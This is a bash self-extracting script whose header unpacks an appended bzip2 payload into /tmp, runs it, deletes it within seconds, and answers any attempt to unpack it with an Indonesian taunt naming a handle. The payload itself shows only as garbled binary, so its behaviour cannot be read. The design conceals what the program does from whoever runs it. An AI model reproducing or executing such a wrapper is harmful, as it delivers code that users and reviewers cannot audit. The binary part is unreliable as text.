#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY���o 4�o�����������`���P  @ �
?�T�4i� h    �%(5	�CF��=!�d�!�� � 4��� h @         p  �  CF�      Q"�52524�CF�dM�4ڀ=C@ �Pp  �  CF�      	 CDM'�Oѕ<��=$�F��#�OS�mOS�I� 5YO�&(-�	+��&���3�$EG�?�|����e���YZ��ݥ�ޕ���F�N�~��,��E�n�i&TJض�q���a
&BN�2�(3�}1 �bv2P1q�W�)3Fh�ȸ3<���rR{%�I
�&�@@VB/��TB+*�h�Cd�(�¤�XՖ5�͢��[�c��,��x
G�X\z�5_s�H�9��>yא��I@�vÁ�J$H�����G})�BI7�Q�7 �#9y/X��1~�����w�%@aa�b,I���m��A���J�0��P��-.(�MJ��m
���a�W�� ���]'_%�A�C9���G�}Gl\b<֔Ɓ�ŷ����ܫ�^��jӏ�g�f�2�t������骹�b�3ApSG� �j���-q��Q5F�{��O��V$�Q�xY�wY��+�Nj�ں'[�m�Ʊ���x�}|c���������b-�I1��^<b�F;���n��*#9�mb\��DsQ4���KH� )�MEI$�(6��0���=0�������w�=� �� ��Ep��P������H���CR�j�S����6�Т�O����3�T���}O�Ug���g�w�ض��ѕ�hA..��F�A�Q)�	T�U��[-f���=�9�`Qƈ���Z��FC��HJg��	p�c�!x��I���C�B��x�f	G��_����9,P��Ye}�P`�`���^�3Іh� ��5%��\ �Ar)	')��Ͽ�!n�. �2D��|i1`�G��-�1B�3<���_�u"�v|�#��S3@�:)��P,"��-B�a��F
\�P\Hd/r/o�S~[�����b&��@��a�s,#�!���5*���m;�=�:��{"��0�#�L"D����0;Y�~��US<C�#���s��~��a��s?X��()�ș �!peƜ�*'x���R��f��0U�{|+L,/�� �G�0+�5�o�հ۸י:�Aq�	�ix���$֤ȕΝ��U�&�L&[^@U�3e9�G!dPP��YBM��)�-C�&c��ڗ���2��j�U X�F�U�E&�e�ͫY5A3���U!噂Á��))aYIni��#J x��@t4�?�s�<�D�������fY��{%���?�x�|���j��c`��������#�2���g��߇1k?��8��3ԮaC�V����$o��r��e�>-1K��@��A.@h��V�b �T��K��e!rU����[���G�~�����~K�A�Bֻ�L����F������>B�����xñ��l-!�Ě�3����	�����썄{\���"�@�f����N�	�MaǠ7�9�3���@�"x
��	�A����.��L磟����R�d�ǟ
��~�;o�\���m�50�*pbc��F��:Ds ZA@�3���ڳ��� ���ʘ�/�-�wU��B& įeǅA��1)G�FU�/v�B���"�J#�:,�+>�E$ɻ6�=͚��)�$�����!�K:x���/Ǔ�F�'8u���5K�c�%��%agP��b����K�:J.1fh�r�M��w��EI�%�K0"f�Q�i���L��K)(0Y��(+�R�<C��R�����_�#��?�Ga`^IAf�$Er��)(4� �)C����t��D��s-vD`y2X����0P0y�Q��� D��aaD��UM\�(~�s%��wM�^r�,>�+󣨄�!����|GA�t��7%N Ruv^�$��t-���gc�əN�H!6@A��+�S(	�1Q����&CE�
�B��԰$�0���q�o���?H�D�t���h�wKLǴ�i"�
O'��e�	dZ2A,�j�D�`��B
�R�ɨ�eb?P@���q�Y�g8b$F����0k�+�ʀ�Dd@���� �x�V��!�z�Ĉe��
��I0�1�ľ�x��y����4�����gͰ�V�"&��%NFe�wI�!�\f��
D\�J�DhH+�f�%Г@�j4ㅟ�rk%&RL��B�(�s,��)bƔ������A��J�" �������uz�=��l�%*A|T�w$S�	����